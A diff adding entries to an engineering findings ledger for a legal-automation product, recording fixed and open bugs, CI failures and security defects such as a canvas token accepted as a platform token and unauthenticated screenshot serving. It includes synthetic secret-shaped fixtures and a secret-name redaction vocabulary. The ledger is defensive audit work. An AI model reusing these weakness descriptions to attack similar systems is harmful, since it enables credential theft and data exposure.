@@ -6,6 +6,612 @@ the RUN_LOG finding tail. Journey findings keep their `F` ids; later findings us
 
 ## OPEN
 
+- **`consent-once-re-prompts-forever`** (OPEN 2026-07-31, MEDIUM, correctness — found while merging
+  the capability-contract and Cofre lines of work). `resolveConsent`'s `once` decision persists
+  nothing (correctly) and sets the run's resume flag — but the engine's resume path re-runs the same
+  step, and `local-command.ts` re-checks `isCommandShapeApproved`, which is still false. The step
+  returns `awaiting_consent` again and the user is asked the same question, indefinitely. There is no
+  per-run "approved for this run only" state anywhere in the module (`signals` carries
+  `resumeFlag`/`cancelled` and nothing else), so `once` cannot currently mean what the dialog says it
+  means. PRE-EXISTING on both merged lines, not introduced by the merge; recorded rather than fixed
+  because the fix is a new piece of run state (a per-run approved-shape set threaded through
+  `RunContext` into the executor), which is its own unit of work with its own tests. `always` is
+  correct as of the same merge — see `consent-approval-scope-mismatch` below.
+
+- **`consent-approval-scope-mismatch`** (FIXED 2026-07-31, MEDIUM, correctness — found by merging,
+  not by either line of work on its own). J-7 made a command-shape approval key on owner + org +
+  MACHINE, and `executors/local-command.ts` looks it up with the connected daemon's real
+  `pairingId`. `service.ts:resolveConsent` wrote it with `pairingId: null`. `idFor()` is an exact
+  key, so the row written was never the row read: **"aprovar sempre" banked nothing the executor
+  could find, the step re-checked, and the same consent dialog returned — forever — on precisely the
+  machines able to run the command.** Invisible on both lines of work for the same reason: every
+  consent test connects a fake daemon with no `pairingId`, so write and lookup both collapsed to
+  `null`. The wiring of the daemon seam at the composition root (`server.ts`, which hands back
+  `conn.pairingId`) is what made it reachable. FIXED by recording the scope on the ConsentRequest at
+  the moment the executor asks — the party that will re-read it decides the key — and having
+  `resolveConsent` bank the answer in it rather than re-derive one. Pinned by
+  `api/tests/automation/service.test.ts` "banks the approval for the MACHINE the run is awaiting on",
+  which uses a non-null `pairingId` and asserts the run COMPLETES, not just that a row exists;
+  verified to fail on revert (`expected false to be true`).
+- **`step-log-tail-outside-the-h1-filter`** (FIXED 2026-07-31, LOW, security defence-in-depth —
+  found by reading the merged engine, not by a failing test). `redactStepRecord` (Cofre H-1) filters
+  `error.message`, `error.details`, `output` and `resolvedAction` before a step record reaches the
+  SSE stream, and its docblock says a new SINK inherits the filter. It does — but a new FIELD does
+  not, and `logTail` (slice E4, the bounded tail of what a step streamed) arrived from the other line
+  of work. So the emitted record carried the tail unfiltered. NOT a live leak on the wired path: the
+  tail's only production source is daemon output, which is redacted at bridge INGRESS (H-4) before
+  the engine ever sees it, and the persisted+served copy comes from the same already-filtered text.
+  FIXED so the docblock is true of the whole record. Pinned by `api/tests/automation/run-logs.test.ts`
+  "a secret streamed into the tail is redacted out of the emitted step record", which asserts the
+  chunk really carried the value before asserting the emitted record does not; verified to fail on
+  revert.
+- **`binary-bytes-allowlist-went-stale-in-the-merge`** (FIXED 2026-07-31, LOW, hygiene). Two of the
+  three shrink-only allowlist entries in `api/tests/security/binary-bytes-gate.test.ts`
+  (`apps/document-source.test.ts`, `llm/anonymise/index.ts`) were cleaned by `1984ac0` on a parallel
+  line of work that had never seen the gate. The ratchet did exactly its job at the merge: it failed
+  on the stale entries instead of passing over them. Entries removed; the list is down to one.
+- **`typist-emits-no-registo-row`** (OPEN 2026-07-29, LOW, auditability — found while pinning F-5).
+  `typistLogin` records credential use on the ITEM (`lastUsedAt`/`lastUsedBy` via `recordUse`) but
+  emits no Registo row, although the A-6 vocabulary defines `cofre_item_used` for exactly this. So a
+  user reading their Registo sees the unlock and the grant but not the login that consumed it. Not a
+  leak — the item row is metadata-only and carries no value — but an audit gap on the one primitive
+  that handles a decrypted credential against a live page. Asserted in
+  `api/tests/security/typist-non-memorable.test.ts` in the NEGATIVE direction so it is visible
+  rather than assumed; flip that assertion when the row is emitted.
+- **`trigger-null-target-blanks-the-webhooks-list`** (FIXED 2026-07-29, MEDIUM, correctness — found
+  by repairing the e2e estate). `GET /api/v1/triggers` emitted `automationId: null` for a trigger
+  created against an ARTIFACT (and `artifactId: null` for the reverse). `shared/` types both as
+  `Id.optional()`, and zod's `.optional()` accepts `undefined` but **rejects `null`** — so
+  `TriggerListResponse` failed to parse client-side, `tryCall` reported not-ok, and the webhooks
+  store kept an empty array. The user saw **"Ainda não existem webhooks" over a populated
+  database**, with no error surfaced anywhere: creating a webhook returned 201, the row never
+  appeared, and nothing said why. FIXED in `triggerView` by omitting absent optionals instead of
+  passing null — the same field-by-field discipline `sessionView` already uses. Worth recording why
+  this survived a surface the schema-coverage gate marks COVERED: every existing fixture set one
+  target or the other, so `null` never appeared in a test. The new cases construct the real
+  database shape (an explicit `null`) and go red against the old mapper.
+- **`pipedream-master-switch-inert`** (FIXED 2026-07-29, HIGH, security — found by repairing the e2e
+  estate, not by reading code). The Pipedream master toggle **could not be turned off**.
+  `PATCH /api/v1/settings` persists via `patchOrgSettings`, which writes the ORG document
+  (`orgs[orgId].settings`); the enforcement read `isPipedreamEnabled()` went to
+  `settings.get('default')` — a different collection, and a document nothing ever writes. It
+  therefore always read null, and on null returned `undefined !== false` → **true**. Two independent
+  defects compounding: the wrong store, and a FAIL-OPEN default on a third-party egress integration.
+  Symptoms an operator would see: turning it off returns 200, `GET /settings` reports
+  `pipedreamEnabled:false`, and the UI toggle snaps back to on — because the toggle renders
+  `status.enabled` (the broken read) while writing to settings. `runPipedreamAction`'s `disabled`
+  guard never fired once. FIXED: the read now uses the org document the write lands in, and defaults
+  to DENY, matching `mergedSettings` (what the API and UI report). Pinned by
+  `api/tests/security/pipedream-master-switch.test.ts` (8 cases; 7 go red against the original).
+  Note for auditors: two pre-existing tests in `tests/integrations/pipedream.test.ts` "disabled" the
+  feature by writing `settings['default']` — they passed by exercising the bug's own plumbing, which
+  is why the defect survived a suite that appeared to cover it.
+- **`npm-audit-gate-unsatisfiable-and-unread`** (FIXED 2026-07-29, MEDIUM, process/security). The
+  `security-gates` job had been failing at `npm audit --audit-level=high` (17 vulnerabilities, 10
+  high). The gate was UNSATISFIABLE as written and therefore unread: two of its highs have no fixed
+  version at all, so the only ways to green were to drop the threshold (stop seeing highs) or wait
+  forever. Meanwhile the genuinely actionable production advisories sat unnoticed behind the noise.
+  FIXED in two parts. **Upgrades** (production highs 9 -> 0 unaccepted): `next` 16.2.10 -> 16.2.12,
+  `dembrandt` 0.23.1 -> 0.25.1, `react-router-dom` -> 7.18.2, plus root `overrides` forcing
+  `postcss` 8.5.24, `sharp` 0.35.3, `adm-zip` 0.6.0, `fast-uri` 3.1.4. **A real gate**
+  (`scripts/audit-gate.mjs`) replacing the blunt flag: it blocks on any unaccepted high/critical in
+  the PRODUCTION tree (`--omit=dev` — those ship), reports dev-tree highs without blocking (a DoS in
+  the linter's glob matcher is not a path to tenant data), and accepts only explicitly documented
+  advisories, each stating why it is unreachable and what would close it. Acceptance propagates
+  transitively to a fixpoint, so a six-deep chain resolves from its root advisory. Verified
+  non-vacuous: a planted unlisted critical fails, and a package that gains its OWN advisory cannot
+  launder it through an accepted dependency.
+- **`archiver-8-removed-the-factory-api`** (OPEN by design 2026-07-29, LOW, dependency). `archiver@8`
+  clears the entire archiver advisory chain, and was tried and REVERTED. v8 is pure ESM exporting
+  classes (`Archiver`, `ZipArchive`, ...) with no default and nothing callable, so
+  `archiver('zip', ...)` in `api/src/services/app-archive.ts` becomes `TypeError: archiver is not a
+  function` and the artifact download 500s (caught by `app-archive.test.ts` +
+  `artifact-family.test.ts`). Migrating is a rewrite of a user-facing download path, not a shim, and
+  the advisory it closes is a glob-expansion DoS that this code cannot reach — entries are added one
+  at a time as `archive.file(absolutePath, { name: relPath })` from our own directory walk;
+  `archive.glob()` and `archive.directory()` are never called. Accepted in `scripts/audit-gate.mjs`
+  with that reasoning. Do the migration the next time `app-archive.ts` is opened for other reasons.
+- **`e2e-estate-15-red-first-honest-measurement`** (PARTIALLY FIXED 2026-07-29 — 9 of 15 closed).
+  With the CSP/CORS bring-up repaired, the estate ran to completion for the first time and reported
+  15 real failures. They were never one problem. **FIXED (9):** five specs drove
+  `POST /api/v1/action`, the old Cortex RPC dispatcher, which this repo does not implement and which
+  is absent from `shared/` entirely — repointed to REST (`web/e2e/helpers/backend-rest.ts`), fixing
+  onboarding (x3) and vertical-profile; two order dependencies (onboarding never set the LEGAL
+  vertical its chips need; pages-manage's bare `getByRole('tab')` now spans page tabs AND filter
+  pills, so `.nth(1)` navigated off the panel holding the search box); two stale ENGLISH selectors in
+  a PT-PT product (`/Usage/i` vs "Utilização"; `iframe[title*="Preview"]` vs "Pré-visualização"); and
+  two REAL PRODUCT BUGS with their own entries — `pipedream-master-switch-inert` and
+  `trigger-null-target-blanks-the-webhooks-list`. **STILL OPEN (6),** each needing a decision rather
+  than a fix:
+  - `artifacts-apps-section`, `update-from-bundle`, `artifact-backend-panel` — need `ekoa.templates`
+    / `ekoa.artifact-backend`, surfaces with **no route and no `shared/` module** in the rebuild.
+    Either that functionality is still wanted (build it) or the specs are stale (retire them
+    explicitly, per the QA process). Not a call to make silently from a test file.
+  - `legal-shared-drift` — invokes `scripts/sync-legal-shared.mjs`, which exists nowhere in the repo
+    or its history, against a canonical `ekoa-data/legal-shared/` that also does not exist. The
+    invariant is real (six scaffolds must not drift from a shared layer); the tool was never ported.
+  - `simuladores-trabalho` — needs `ekoa-data/apps/simuladores-trabalho/build.mjs`, a user-app build
+    artifact not in the repo. The underlying logic IS ported and unit-tested
+    (`api/src/legal/simuladores.ts`, `api/tests/legal/simuladores.test.ts`).
+  - `legal-rcbe` — NOT idempotent: it completes the demo obligation and re-running finds it already
+    `cumprida`, so it asserts "atraso|Pendente" against fulfilled state. The scaffold has a reset,
+    but it is gated on `isDemoActive()` (an injected tour runtime the spec cannot trigger) and the
+    data lives in served-app shared storage that survives runs. Needs a deterministic reset hook.
+
+- **`ci-e2e-step-could-never-pass`** (FIXED 2026-07-29, MEDIUM, process — surfaced when the lane
+  first reached the e2e step). With typecheck, `npm test` and `npm run build` all green for the
+  first time, `npm run e2e` failed for two structural reasons, neither a test defect: (1) Playwright's
+  browsers were never installed on the runner, so the first `chromium.launch()` died with
+  "Executable doesn't exist at ~/.cache/ms-playwright/..." — `Dockerfile.api` already installs them
+  for exactly this reason; (2) the step ran the BARE ledger runner, which needs a live api on :4111
+  and reports "10 due driver(s) require a live dev API — an unreachable-server skip is NOT green".
+  The repo already contains the fix: `scripts/e2e-with-server.mjs` (`npm run e2e:server`) boots
+  dev-api on an ephemeral memory-mongo, waits for READY plus the featured prebuild, runs the ledger
+  and tears down — and its own docblock says "CI sets EKOA_SCREENSHOTS_DISABLED", i.e. it was
+  written for this lane, which then never called it. FIXED by installing chromium and calling
+  `e2e:server`; it needs `npm run build` output, which the preceding step already produces. Same
+  class as `ci-typecheck-never-ran` and `subprocess-isolation-test-could-never-pass-on-ci`: a step
+  that had never once executed its actual work, invisible for as long as an earlier step failed
+  first.
+- **`subprocess-isolation-test-could-never-pass-on-ci`** (FIXED 2026-07-29, MEDIUM, test-integrity
+  — surfaced the moment CI first reached `npm test`). `api/tests/llm/subprocess-isolation.test.ts`
+  asserted that the literal string `ekoa-code` appears nowhere in the SDK subprocess spawn contract,
+  using the repo's directory NAME as a proxy for "a host path leaked". On GitHub Actions the repo is
+  *named* `ekoa-code`, so GitHub's own injected metadata (`GITHUB_REPOSITORY`,
+  `GITHUB_WORKFLOW_REF`) and npm's workspace-PARENT bin entry
+  (`/home/runner/work/ekoa-code/node_modules/.bin` — NOT under the checkout root, so correctly kept
+  by the F25 `underPathRoot` filter) all contain it. **The test was green locally and structurally
+  red on CI, and could never have passed there.** Nobody saw it because the lane died at typecheck
+  before reaching `npm test` (`ci-typecheck-never-ran`) — fixing CI is what exposed it. FIXED by
+  asserting the invariant the code actually implements: the sandbox is neither the server cwd nor
+  the operator home, `env.HOME` is the sandbox, no NON-PATH value carries the checkout or the
+  operator home, and PATH carries no segment under the checkout root. PATH is exempt from the
+  home-check BY DESIGN and by written disposition (the accepted `subprocess PATH home-path residual`
+  below): node and the toolchain live under `$HOME` on nvm/fnm/volta/asdf hosts and the SDK spawns a
+  bare `node` against this PATH, so filtering `$HOME` out of it ENOENTs every model subprocess.
+  Verified three ways: passes under the simulated CI vars, the old assertion provably fails under
+  the same vars, and it still goes red when the PATH-root filter is removed.
+- **`gitleaks-red-on-synthetic-fixtures`** (FIXED 2026-07-29, MEDIUM, process — found when the
+  first push finally reached CI). The `security-gates` job had been RED since 2026-07-27, failing at
+  the gitleaks step on five `generic-api-key` hits. All five are synthetic credential fixtures in
+  the Cofre security suite (`sk-live-COFRE-TEST-0001`, `sk-live-EXFILTRATE-ME-0001`,
+  `sk-live-BOUNDARY-TEST-0001`, `sk-live-abcdef123456`, and — added by this session's J-3 —
+  `deliver-me-J3-SECRET-9911`). They are deliberately secret-SHAPED, because the suites they belong
+  to test that a secret-shaped value is redacted, refused or never echoed, and a fixture that did
+  not look like a credential would prove nothing. Two consequences of the redness are the reason
+  this is MEDIUM rather than cosmetic: a red gate carries no signal, and it had been red long enough
+  that a REAL leak would have arrived into an already-failing check. FIXED by allowlisting the five
+  VALUES in `scripts/gitleaks.toml` — deliberately not by path: an
+  `api/tests/security/**` path allowlist is one line instead of five and would blind the scanner to
+  a real token pasted into a test file, which is a normal way credentials escape. Renaming the
+  fixtures was not an option: `gitleaks detect` scans git HISTORY, so the original literal stays
+  reachable in the commit that introduced it. Going forward a new fixture should carry
+  `EKOA-SYNTHETIC-`, covered generically. Verified precise: a real-looking `sk-live-...` in the same
+  directory still fails the scan.
+- **`bridge-ingress-freetext-header-residual`** (OPEN by design 2026-07-29, LOW, confidentiality —
+  found while building H-4). The ingress filter has two legs: value-keyed (exact, for values Cortex
+  delivered) and name-pattern (`redactBodyByName`, for credentials Cortex never held). The name leg
+  understands JSON keys and `key=value` pairs. A colon-separated header line in free-text stdout —
+  `Authorization: Bearer sk-live-...` — matches neither shape and survives it, so such a value is
+  removed only when Cortex DELIVERED it and the value leg recognises it. NOT closed, deliberately:
+  widening the name leg to colon-separated pairs would fire on ordinary prose, including any
+  `word: value` line in a document excerpt, and a filter that mangles legitimate output is one
+  people route around. Pinned in BOTH directions by
+  `api/tests/security/bridge-ingress-redaction.test.ts` (the leak asserted as surviving, and the
+  delivered-value mitigation asserted as working), so if it is ever closed the expectation flips
+  and the test says so rather than the behaviour drifting silently.
+- **`ci-typecheck-never-ran`** (FIXED 2026-07-28, HIGH, process — found while fixing the red
+  typecheck baseline for A-8). **The per-PR CI lane has never successfully typechecked `api/` or
+  `web/`.** `.github/workflows/ci.yml` ran `npm run typecheck` with no prior build of `shared`, but
+  `api/` and `web/` resolve `@ekoa/shared` through its package `types` field
+  (`shared/dist/index.d.ts`), which is gitignored and only exists after `npm run build --workspace
+  shared`. On a fresh `npm ci` checkout the step therefore died with **87 x TS2307 "Cannot find
+  module '@ekoa/shared'"** — reproduced locally by moving `shared/dist` aside — so the step failed
+  for a MISSING ARTIFACT, never reaching a single real type error. A local tree hides it completely,
+  because `shared/dist` survives from an earlier build. Two consequences, and the second is the
+  reason this is HIGH rather than a chore: (1) `ci` has been red on `main` for at least the last
+  eight runs and the redness carried no information, which is how a lane stops being read; (2) real
+  type errors accumulated on `main` unnoticed — 9 of them at the time of writing, listed below —
+  because nothing anywhere was checking. FIXED by building `shared` before the typecheck step.
+  Verification is the next CI run on push; the local equivalent (`rm -rf shared/dist && npm run
+  build --workspace shared && npm run typecheck`) is green.
+- **`main-typecheck-red-9-errors`** (FIXED 2026-07-28, MEDIUM, correctness — the errors
+  `ci-typecheck-never-ran` was hiding). Nine `tsc` errors on clean `main` at `619277b`, all landed
+  by recent Cofre work: (a) `scripts/migrate/ciphertext-v2.ts` imported a non-existent export — see
+  `k4-migration-dead-on-arrival`, which is the more serious half; (b) `tests/bridge/revoke.test.ts`
+  (x2) and `tests/fake-daemon/correlation-join.test.ts` passed a `DelegationActor` without the
+  `orgId` that E-1 made REQUIRED — `integration.test.ts` was updated in that change and these two
+  were missed; (c) `tests/security/page-value-leaks.test.ts` (x3) built css locators as
+  `{strategy:'css', value}` where the `Locator` union requires `{strategy:'css', selector}`, so
+  `describeLocator` read `undefined` and the cache content under test was `css="undefined"` — the
+  assertions passed while never exercising a well-formed locator, so this was a green test proving
+  less than it claimed (now also asserts the selector IS retained, since shape is what the summary
+  is allowed to keep); (d) `tests/security/screenshot-masking.test.ts` (x2) indexed
+  `mock.calls[0][0]` on a zero-arg `vi.fn`, whose recorded tuple type is `[]` — the `as {...}` cast
+  was papering over an argument the mock's type said could not exist. All fixed; `npm run
+  typecheck` is green across the three workspaces and `npm test` is 130 shared / 2555 api / 359 web.
+- **`shared-suite-counted-twice`** (FIXED 2026-07-28, MEDIUM, test-integrity — found while
+  verifying the `ci-typecheck-never-ran` fix). The `shared` suite collected every test TWICE — once
+  from `src/`, once from the compiled `dist/` copy — so its reported size was a function of a BUILD
+  ARTIFACT, not of the tests. Observed in one sitting: **5 files/130 tests** on a stale dist,
+  **6/144** after a rebuild, **3/72** on a clean checkout. The true count is 3 files / 72 tests, so
+  every "shared 130" in the recent commit messages was inflated by a factor of ~1.8 and the number
+  moved whenever someone happened to build. Two causes, both fixed: `shared/tsconfig.json` compiled
+  `src/**/*.test.ts` into the published `dist/` (tests were shipped to consumers as well as
+  double-collected) — now excluded; and `shared` had no vitest config, while **Vitest 4 narrowed
+  its default `exclude` to `node_modules` and `.git` only**, dropping the dist glob that older
+  versions excluded — now `shared/vitest.config.ts` pins `include: src/**/*.test.ts` and restores
+  the dist exclusion. `api/` and `web/` were never affected: their builds emit no test files.
+  Verified stable at 3/72 across a clean build, a rebuild and a full-lane run. Worth noting for
+  anyone auditing the ledger: a census that quotes counts is only as trustworthy as the collection
+  behind it, and this one silently changed under a minor-version default.
+- **`k4-migration-dead-on-arrival`** (FIXED 2026-07-29, MEDIUM, correctness/governance — found by
+  the A-8 typecheck sweep). `api/scripts/migrate/ciphertext-v2.ts` is journaled as landed (commit
+  `f993d06`, `docs/decisions.md` 2026-07-28 K-4) but **had never compiled and has never run**. It
+  imported `cofreItems` from `src/data/stores.js`, which does not export it — the Cofre item store
+  lives in `src/cofre/store.ts`, which exports `__cofreItemsStoreForMigration` for exactly this
+  caller. FIXED here only to the extent the red baseline demanded: the import is corrected and the
+  file now typechecks. Still OPEN, and this is the part that matters — the migration is **not
+  wired and not proven**: (a) nothing registers it in `api/scripts/migrate/cli.ts`, so there is no
+  way to invoke it; (b) the `gate:crypto-version` script the decision entry names does not exist in
+  `package.json`; (c) it has no test, so `module_tests` never covered it. The consequence is that
+  the v1 weakness the entry claims K-4 removes — a v1 row is under the flat global key and decrypts
+  under ANY tenant argument — is still fully present in any deployed database, and the journal says
+  otherwise. Close by wiring the CLI entry, adding the gate script, and adding a hermetic test that
+  seeds v1 rows, migrates, and asserts `noV1CiphertextRemains()`. Note while doing so that
+  `noV1CiphertextRemains()` currently CALLS `migrateCiphertextToV2()`, so the "check" mutates the
+  database — safe because the migration is idempotent, but a gate that writes is the wrong shape
+  and should be split into a read-only scan. **CLOSED 2026-07-29**: scan and migrate are now
+  separate (`scanCiphertextVersions()` is read-only, so the post-cutover gate can be pointed at
+  production to ask a question); `api/scripts/migrate/ciphertext-v2-cli.ts` is the entry point,
+  dry-run by default with `--execute` required to write (ch10 §10.3 rule 3); `migrate:ciphertext-v2`
+  and `gate:crypto-version` are wired in `api/package.json`, the latter exiting non-zero while any
+  v1 row remains so it can gate CI after the cutover window. Proven by
+  `api/tests/security/ciphertext-v2-migration.test.ts` (9 cases, both plants red) AND by driving the
+  real CLI against an ephemeral mongo: gate exit 1 with a seeded v1 row -> `--execute` reports
+  COMPLETE -> gate exit 0. The decisive test is not "the row changed shape" but "the row can no
+  longer be decrypted under the WRONG tenant", which is the property K-1 only gave to new writes.
+- **`cofre-raw-store-lint-rule-missing`** (FIXED 2026-07-29, LOW, defence-in-depth — found by the
+  A-8 sweep). Plan item B-1 specified "an eslint rule forbidding any import of the raw `cofre_items`
+  store handle outside `api/src/cofre/`, and forbidding re-derivation of the scoping predicate".
+  No such rule exists in `.eslintrc.cjs` — the module-direction zone array lists `./api/src/cofre`
+  only as a TARGET that may not import `routes/`/`server.ts`. So the scoped-repository chokepoint
+  that makes the Cofre the third `OwnerVisibilityScoped` consumer rests on convention alone, and
+  `__cofreItemsStoreForMigration` (a deliberately ugly name, now imported by the migration script)
+  is greppable but not enforced. Not exploitable today — the only importer is the migration — but
+  the whole point of B-1's chokepoint is that it cannot be bypassed by a future caller who has not
+  read the plan. FIXED: `.eslintrc.cjs` bans `**/cofre/store` outside `api/src/cofre/**`, with
+  `api/scripts/migrate/**` legitimately outside the rule's file set (a migration rewrites every
+  tenant's rows and so cannot go through an owner-scoped repository). Worth recording HOW it was
+  nearly got wrong: the first attempt added a second `no-restricted-imports` override for
+  `api/src/**`, and because ESLint REPLACES rather than merges that rule per file, it silently wiped
+  the `@anthropic-ai` egress ban (FIXED-3/8/13) for every non-llm file while appearing to add a
+  rule — a lint config that looked stricter and was materially weaker. Both bans now live in one
+  override per file set, and the llm/ and cofre/ exemptions RESTATE the ban they keep instead of
+  switching the rule off. All four directions verified against planted imports.
+- **`page-values-to-log-and-memory`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre discovery
+  gate R-4 + R-5). Two leaks of the same class: values read off a LIVE PAGE of an authenticated
+  session. (R-4) `automation/engine.ts` merged verifier-extracted values into the shared `inputs`
+  map and logged them with `console.log(\`... ${k}="${v}" ...\`)` — cleartext in the process log,
+  and from `inputs` they are template-substituted into downstream `api_call` URLs/headers/bodies
+  whose RESOLVED form is persisted. FIXED: the log records the key and the LENGTH only, and a
+  secret-shaped KEY NAME (otp/token/password/senha/sessao/credential/pin/cvv, PT-PT included) is
+  refused outright so the value never joins `inputs` at all. The vocabulary is pinned in BOTH
+  directions — a false positive silently refuses an ordinary input, and a bare `/auth/` matched
+  `author`. (R-5) `automation/cache.ts` wrote the resolved action into ORGANIZATIONAL MEMORY at
+  tier `active` through the ordinary `createMemory` surface, and `memory/resolver.ts` `isInjectable`
+  excluded only `tier==='archive'` — so those rows were term-scored against the user's ordinary
+  chat prompt and injected under `# Memória`. `summariseAction` put the first 40 chars of any
+  `fill`, the FULL `navigate` URL and the FULL `select` value into the scored `content`, so a
+  magic-link or SSO-callback URL was replayed verbatim to the chat model on term overlap. FIXED by
+  a `nonMemorable` memory class that `isInjectable` now requires to be absent (structurally "not a
+  memory", distinct from `tier:'archive'` which is merely user-hidden), set on every action- and
+  assertion-cache row; plus de-valuing the summaries at the source — length for a `fill`, origin +
+  pathname for a `navigate` (the query string is where the tokens live), no literal for a `select`
+  or an assertion. The cache still works: the exact action lives structurally in `cachePayload`,
+  which was never term-scored. Pinned by `api/tests/security/page-value-leaks.test.ts` (44 cases).
+- **`screenshot-plane-unauthenticated`** (FIXED 2026-07-27, HIGH, confidentiality + GDPR — Cofre
+  discovery gate R-3). `/automation-screenshots` was an `express.static` mount over
+  `<dataDir>/automation-runs` with NO auth middleware, NO tenant check and NO expiry. The recorded
+  rationale (`docs/decisions.md`, 2026-07-11) was that an `<img>` cannot carry an Authorization
+  header, so "the unguessable automationId/runId path IS the capability". Two problems: the PNGs
+  are screenshots of an AUTHENTICATED session on a client portal (for this product, processo
+  numbers and client NIFs rendered as pixels), and the run id is not treated as a secret anywhere
+  else — it travels in SSE frames, persisted step records, the run API and logs. FIXED without
+  trading the control away, using the pattern the repo already applies to the SSE stream for the
+  identical constraint: a short-lived platform JWT in the query string (`verifySseToken`), then a
+  run lookup that checks org and ownership before a byte is streamed. Cross-tenant reads answer
+  404, not 403, so existence is not an oracle; an unattributable legacy run (no `orgId`) is refused
+  rather than served; path segments go through the containment resolver; non-PNG files are refused.
+  The URL SHAPE is unchanged, so every persisted `screenshotUrl` keeps resolving — the web client
+  appends `?token=` via the existing `withPreviewToken` helper. RETENTION: nothing ever deleted
+  these PNGs (every reference in `api/src` was a write or a path builder), a GDPR erasure gap over
+  an unindexed tree, so a 7-day sweeper and a `deleteRunScreenshots` erasure path land in the same
+  change. Pinned by `api/tests/security/screenshot-plane.test.ts` (14 cases, including a
+  traversal-escape test on the erasure path) and a REWRITTEN
+  `api/tests/contract/automation-screenshots.test.ts`, which previously asserted the unauthenticated
+  read as the contract.
+- **`d8-oauth-custody-plane`** (AUDIT COMPLETE 2026-07-27 — the audit no discovery-gate pass
+  covered). The live OAuth credential-custody plane holds refresh tokens TODAY and had received no
+  verdict from any of D1-D7. Audited: `integrations/platform-oauth.ts`, `m365-proxy.ts`,
+  `prefetch.ts`, `app-sso-sessions.ts`, `pipedream.ts`.
+
+  **CONFORMS, and should be reused rather than replaced.** `platform-oauth.ts` encrypts the token
+  bundle at rest through the one crypto module, refreshes on expiry and re-persists, and — the part
+  worth calling out — uses a SINGLEFLIGHT per row so a rotating `refresh_token` can never be
+  double-spent by a lazy refresh racing a sweep. That is a genuinely hard property and it is already
+  correct. External I/O defaults to the SSRF-guarded fetcher. `connect` logs `{provider}` only.
+  `m365-proxy.ts` is the CLOSEST SHIPPED ANALOGUE OF THE I9 PRIMITIVE: it forwards the Graph path
+  verbatim while injecting a freshly-refreshed Bearer server-side, so the served artifact never sees
+  the token — exactly the "caller names a reference, a fixed primitive executes" shape the Cofre
+  needs, and WS-J should model on it. `pipedream.ts` keeps project keys in one org-scoped encrypted
+  row, decrypted just-in-time and never logged/thrown/returned, behind a master toggle and a billing
+  gate. `app-sso-sessions.ts` enforces artifact isolation server-side (`session.appId === canonical
+  id`, never by cookie path) and its pending-auth consume is atomic (`findOneAndDelete`), so the
+  no-replay property is LOCAL rather than relying on the IdP.
+
+  **DIVERGES — the gaps that matter for the Cofre.** (1) The whole plane is a PARALLEL custody
+  path: it never routes through `cofre/unwrap()`, so none of it has a grant, a lock, per-item origin
+  binding, or an "item used" Registo event. A user cannot see or revoke these credentials from the
+  Cofre, and "Bloquear tudo" does not touch them. (2) It uses the UNSCOPED `encrypt()`, so ciphertext
+  is not org-bound — the same finding already recorded against integration credentials, under the
+  same single global `ENCRYPTION_KEY`. (3) `prefetch.ts` injects OAuth-fetched email/calendar/file
+  CONTENT into the chat SYSTEM PROMPT (`agents/context.ts:170`), cached per org for 60s. That is
+  model-bound text and therefore IS covered by the anonymisation chokepoint (`client.ts:967-968`
+  anonymises `systemPrompt` as well as `prompt`) — so I1 holds, with the honest residual that the
+  coverage is only as good as the deny-list and the PT recognizers. Worth stating explicitly because
+  the gate never verdicted it and a reader could reasonably have assumed otherwise.
+
+  **CONSEQUENCE FOR B-4.** The migration should bring these rows under `unwrap()` — gaining grants,
+  lock-now/lock-all and the Registo events — WITHOUT rewriting the refresh machinery, whose
+  singleflight is the part that is hard to get right. `oauth_token` is already a Cofre item type.
+- **`canvas-token-is-a-platform-token`** (FIXED 2026-07-27, HIGH, authentication — Cofre F-1, the
+  `api/src/streaming/` security pass). The canvas (screencast) token is signed with the SAME secret
+  as platform session tokens and carried NO class marker: `sub` + `jti`, no `aud`. `auth/jwt.ts`'s
+  token-class guard only knew about `ekoa-bridge`, so `verifyToken` ACCEPTED a canvas token and
+  returned claims with a valid `sub`/`jti` and `role`/`orgId` undefined. `requireAuth` then passed
+  it end-to-end: the jti exists, it is not revoked, `getActivation(sub)` resolves for a real user,
+  and `iat` is fresh. VERIFIED EMPIRICALLY with a throwaway probe before being written up, not
+  inferred from a read. The consequence is not theoretical — every route that authorizes on
+  `req.user.sub` ALONE never reads `role` or `orgId`, so a leaked 600-second canvas token was a
+  platform bearer token for gateway-key MINT (which returns a long-lived API key), the bridge token
+  endpoint, and the Cofre item routes. FIXED with the same mechanism the bridge token already used:
+  `aud: 'ekoa-canvas'` minted and required on the media channel, and refused by the platform
+  verifier. The guard checks `traceId` as well as `aud`, so a token minted before the audience
+  landed gets no grandfathered window. Pinned by `api/tests/security/canvas-token-class.test.ts`
+  (8 cases, including a validly-signed pre-audience token that exercises the traceId branch rather
+  than merely failing a signature check).
+- **`streaming-screencast-has-no-credential-suppression`** (OPEN, HIGH, confidentiality — Cofre F-1;
+  BLOCKS F-2 and D-5). The CDP screencast in `api/src/streaming/session.ts` is a continuous JPEG
+  stream of the LIVE page, and it is a SEPARATE path from the automation screenshot that H-2/H-3
+  masks. `Page.startScreencast` has no mask option — Playwright's `mask` is a `screenshot()` feature
+  only — so masking is not available here and SUPPRESSION is the only correct control: the
+  screencast must be stopped for the duration of a typist credential window, and the typist must
+  refuse to run at all if it cannot confirm the screencast is stopped. Until that lands, WS-F's
+  typist must not fill a credential while a canvas session is attached. This is the specific reason
+  the plan blocks F-2 on F-1, and it is now a named finding rather than a scheduling note.
+- **`browser-context-leak-and-docblock-drift`** (FIXED 2026-07-27, MEDIUM, resource + accuracy —
+  Cofre discovery gate G-3). `LocalBrowserSession.dispose()` closed only the PAGE, so every run
+  leaked its browser context — and with it the entire cookie jar of an authenticated session — for
+  the lifetime of the process. FIXED by retaining the context and closing it in `dispose()`, both
+  closes best-effort so teardown never fails a completed run. SEPARATELY, the module's docblock and
+  `ensurePage`'s comment described "the owner's PERSISTENT context" with concurrent runs for one
+  owner sharing cookies; the composition root has always handed back `browser.newContext()`,
+  ignoring the owner entirely. The divergence is safe in the direction that matters — a fresh
+  isolated context per session means no cookie jar is reused across runs OR owners, which is
+  stricter than the documented model — but reading the docblock instead of the composition root
+  produced wrong conclusions twice during the discovery gate. The comments now describe the code as
+  built, and the behaviour is pinned by test rather than asserted by comment. Pinned by
+  `api/tests/security/browser-context-lifecycle.test.ts` (5 cases).
+- **`planner-and-assertion-echo-page-content`** (FIXED 2026-07-27, MEDIUM, confidentiality — Cofre
+  discovery gate H-6 + the H-1 assertion leg). Two messages carried content into three destinations
